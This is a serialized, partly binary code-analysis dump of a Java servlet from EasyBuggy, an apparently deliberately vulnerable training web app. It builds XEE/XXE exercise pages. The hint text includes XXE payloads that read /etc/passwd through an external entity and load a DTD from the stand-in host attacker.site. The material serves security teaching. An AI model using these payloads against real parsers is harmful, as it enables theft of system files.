+%38java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*(
+
+__unknown_file (
+
+<br><br>2append(Ljava/lang/String;)éã
+J< J(Z
+%39java.lang.String"uorg.t246osslab.easybuggy.core.servlets.AbstractServlet#getMsg(Ljava/lang/String;Ljava/util/Locale;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*,
+
+__unknown_file (
+label.upload*8
+
+__unknown_file (
+
+localejava.util.Locale2,getMsg(Ljava/lang/String;Ljava/util/Locale;)à
+Ö
+J J(Z
+%40java.lang.String"__concat*/
+J J(9#!
+<input type=\"submit\" value=\"*%
+J< J(Z
+
+%39java.lang.Stringm
+k
+J J(d
+%41java.lang.String"__concat*%
+J J(Z
+
+%40java.lang.String*
+J] J(d	
+\" />êç
+J J(e
+%42java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*5
+
+__unknown_file (
+
+%41java.lang.String2append(Ljava/lang/String;)ÉÄ
+K K(#
+%43java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*(
+
+__unknown_file (
+
+<br><br>2append(Ljava/lang/String;)å
+â
+L L(,
+%44java.lang.Object"__mapGet*,
+
+__unknown_file (
+
+%jsp_context*,
+
+__unknown_file (
+errorMessageß
+§
+L L(4
+%45boolean"	__compare*"
+
+__unknown_file (
+!=*5
+
+__unknown_file (
+
+%44java.lang.Object*"
+
+__unknown_file (
+""*
+3
+4*Å
+65 5(øº
+5 5(d
+%8java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*e
+
+__unknown_file (IG
+E<form method=\"post\" action=\"xxe\" enctype=\"multipart/form-data\">2append(Ljava/lang/String;)òï
+6 6(E
+%9java.lang.String"uorg.t246osslab.easybuggy.core.servlets.AbstractServlet#getMsg(Ljava/lang/String;Ljava/util/Locale;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*7
+
+__unknown_file (
+msg.update.users.by.xml*8
+
+__unknown_file (
+
+localejava.util.Locale2,getMsg(Ljava/lang/String;Ljava/util/Locale;)èå
+6 6(F
+%10java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*4
+
+__unknown_file (
+
+%9java.lang.String2append(Ljava/lang/String;)*
+5*˝
+72 2(øº
+2 2(d
+%5java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*e
+
+__unknown_file (IG
+E<form method=\"post\" action=\"xee\" enctype=\"multipart/form-data\">2append(Ljava/lang/String;)ïí
+3 3(B
+%6java.lang.String"uorg.t246osslab.easybuggy.core.servlets.AbstractServlet#getMsg(Ljava/lang/String;Ljava/util/Locale;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*4
+
+__unknown_file (
+msg.add.users.by.xml*8
+
+__unknown_file (
+
+localejava.util.Locale2,getMsg(Ljava/lang/String;Ljava/util/Locale;)éã
+3 3(C
+%7java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*4
+
+__unknown_file (
+
+%6java.lang.String2append(Ljava/lang/String;)*
+5*˝
+8. .(∫∑
+. .('
+%0java.util.Locale":javax.servlet.ServletRequest#getLocale()Ljava/util/Locale;*J
+
+__unknown_file (.
+,
+req%javax.servlet.http.HttpServletRequest2getLocale()d
+b
+. .((
+localejava.util.Locale"__id*4
+
+__unknown_file (
+
+%0java.util.LocaleDB
+0% 0(2
+%1java.lang.StringBuilder"java.lang.StringBuilderr
+p
+0! 0(4
+%2"!java.lang.StringBuilder#<init>()V*;
+
+__unknown_file (
+
+%1java.lang.StringBuildert
+r
+0 0(5#
+bodyHtmljava.lang.StringBuilder"__id*;
+
+__unknown_file (
+
+%1java.lang.StringBuilderÕ 
+1 1(.
+%3java.lang.String"Hjavax.servlet.http.HttpServletRequest#getServletPath()Ljava/lang/String;*J
+
+__unknown_file (.
+,
+req%javax.servlet.http.HttpServletRequest2getServletPath()¬ø
+1 1(/
+%4boolean",java.lang.String#equals(Ljava/lang/Object;)Z*$
+
+__unknown_file (
+/xee*4
+
+__unknown_file (
+
+%3java.lang.String2equals(Ljava/lang/Object;)*
+6
+7*&
+0 "
+y y(
+implicit return*øB
+1i i(ùö
+i i(D
+%137java.lang.String"yorg.t246osslab.easybuggy.core.servlets.AbstractServlet#getInfoMsg(Ljava/lang/String;Ljava/util/Locale;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*2
+
+__unknown_file (
+msg.note.xxe.step1*8
+
+__unknown_file (
+
+localejava.util.Locale20getInfoMsg(Ljava/lang/String;Ljava/util/Locale;)íè
+i i(E
+%138java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*6
+
+__unknown_file (
+
+%137java.lang.String2append(Ljava/lang/String;)¨©
+j j(O
+%139java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*P
+
+__unknown_file (42
+0<pre id=\"code\" class=\"prettyprint lang-xml\">2append(Ljava/lang/String;)ﬂ‹
+k k(Y
+%140java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*L
+
+__unknown_file (0.
+,<!ENTITY % p1 SYSTEM \"file:///etc/passwd\">2!encodeForHTML(Ljava/lang/String;)n
+l
+k k(b
+%141java.lang.String"__concat*&
+k k(Y
+
+%140java.lang.String*
+k\ k(b
+<br>íè
+k k(c
+%142java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*6
+
+__unknown_file (
+
+%141java.lang.String2append(Ljava/lang/String;)Ê„
+l l(`
+%143java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*S
+
+__unknown_file (75
+3<!ENTITY % p2 \"<!ATTLIST users ou CDATA '%p1;'>\">2!encodeForHTML(Ljava/lang/String;)n
+l
+l l(i
+%144java.lang.String"__concat*&
+l l(`
+
+%143java.lang.String*
+lc l(i
+<br>íè
+l l(j
+%145java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*6
+
+__unknown_file (
+
+%144java.lang.String2append(Ljava/lang/String;)∑¥
+m m(1
+%146java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*$
+
+__unknown_file (
+%p2;2!encodeForHTML(Ljava/lang/String;)íè
+m m(2
+%147java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*6
+
+__unknown_file (
+
+%146java.lang.String2append(Ljava/lang/String;)Çˇ
+n n(%
+%148java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*&
+
+__unknown_file (
+
+</pre>2append(Ljava/lang/String;)Ä˝
+o o(#
+%149java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*$
+
+__unknown_file (
+<br>2append(Ljava/lang/String;)ùö
+p p(D
+%150java.lang.String"yorg.t246osslab.easybuggy.core.servlets.AbstractServlet#getInfoMsg(Ljava/lang/String;Ljava/util/Locale;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*2
+
+__unknown_file (
+msg.note.xxe.step2*8
+
+__unknown_file (
+
+localejava.util.Locale20getInfoMsg(Ljava/lang/String;Ljava/util/Locale;)íè
+p p(E
+%151java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*6
+
+__unknown_file (
+
+%150java.lang.String2append(Ljava/lang/String;)¨©
+q q(O
+%152java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*P
+
+__unknown_file (42
+0<pre id=\"code\" class=\"prettyprint lang-xml\">2append(Ljava/lang/String;) «
+r r(D
+%153java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*7
+
+__unknown_file (
+<?xml version=\"1.0\"?>2!encodeForHTML(Ljava/lang/String;)n
+l
+r r(M
+%154java.lang.String"__concat*&
+r r(D
+
+%153java.lang.String*
+rG r(M
+<br>íè
+r r(N
+%155java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*6
+
+__unknown_file (
+
+%154java.lang.String2append(Ljava/lang/String;)Û
+s s(m
+%156java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*`
+
+__unknown_file (DB
+@<!DOCTYPE users SYSTEM \"http://attacker.site/vulnerable.dtd\" >2!encodeForHTML(Ljava/lang/String;)n
+l
+s s(v
+%157java.lang.String"__concat*&
+s s(m
+
+%156java.lang.String*
+sp s(v
+<br>íè
+s s(w
+%158java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*6
+
+__unknown_file (
+
+%157java.lang.String2append(Ljava/lang/String;)ºπ
+t t(6
+%159java.lang.String"jorg.t246osslab.easybuggy.core.servlets.AbstractServlet#encodeForHTML(Ljava/lang/String;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*)
+
+__unknown_file (
+	<users />2!encodeForHTML(Ljava/lang/String;)íè
+t t(7
+%160java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*6
+
+__unknown_file (
+
+%159java.lang.String2append(Ljava/lang/String;)Çˇ
+u u(%
+%161java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*&
+
+__unknown_file (
+
+</pre>2append(Ljava/lang/String;)ÉÄ
+v v(&
+%162java.lang.StringBuilder"Kjava.lang.StringBuilder#append(Ljava/lang/String;)Ljava/lang/StringBuilder;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder*'
+
+__unknown_file (	
+</form>2append(Ljava/lang/String;)ëé
+w' w(G
+%163java.lang.String"uorg.t246osslab.easybuggy.core.servlets.AbstractServlet#getMsg(Ljava/lang/String;Ljava/util/Locale;)Ljava/lang/String;*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*.
+
+__unknown_file (
+title.xxe.page*8
+
+__unknown_file (
+
+localejava.util.Locale2,getMsg(Ljava/lang/String;Ljava/util/Locale;)¨©
+wI w(\
+%164java.lang.String"4java.lang.StringBuilder#toString()Ljava/lang/String;*A
+
+__unknown_file (%
+#
+bodyHtmljava.lang.StringBuilder2
+toString()«ƒ
+w w(]
+%165void"Ωorg.t246osslab.easybuggy.core.servlets.AbstractServlet#responseToClient(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;Ljava/lang/String;Ljava/lang/String;)V*Y
+
+__unknown_file (=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet*J
+
+__unknown_file (.
+,
+req%javax.servlet.http.HttpServletRequest*K
+
+__unknown_file (/
+-
+res&javax.servlet.http.HttpServletResponse*6
+
+__unknown_file (
+
+%163java.lang.String*6
+
+__unknown_file (
+
+%164java.lang.String2ÖresponseToClient(Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;Ljava/lang/String;Ljava/lang/String;)*
+0:8
+, ,(0,
+req%javax.servlet.http.HttpServletRequest:9
+,1 ,(H-
+res&javax.servlet.http.HttpServletResponseB=;
+9org.t246osslab.easybuggy.vulnerabilities.XEEandXXEServlet
